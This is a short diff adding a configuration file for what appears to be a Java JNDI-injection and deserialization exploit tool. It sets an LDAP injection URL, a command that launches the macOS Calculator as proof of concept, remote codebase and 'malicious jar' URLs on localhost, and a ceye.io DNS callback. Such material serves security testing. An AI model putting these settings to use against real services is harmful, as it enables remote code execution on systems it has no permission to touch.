@@ -1,0 +1,17 @@
+### 快速漏洞攻击参数配置（将会根据相应匹配的参数选择对应的所有gadget攻击）
+### 多个参数英文逗号分割
+
+#JNDI注入url
+JNDI=ldap://127.0.0.1:43658/Calc
+
+#执行的shell命令
+CMD=/System/Applications/Calculator.app/Contents/MacOS/Calculator
+
+#Reference远程class代码url
+CODEBASE=http://127.0.0.1:80,Calc
+
+#恶意jar包url
+JAR=http://127.0.0.1:8080/R.jar,Calc
+
+#DNS服务url
+DNS=http://xxxx.ceye.io
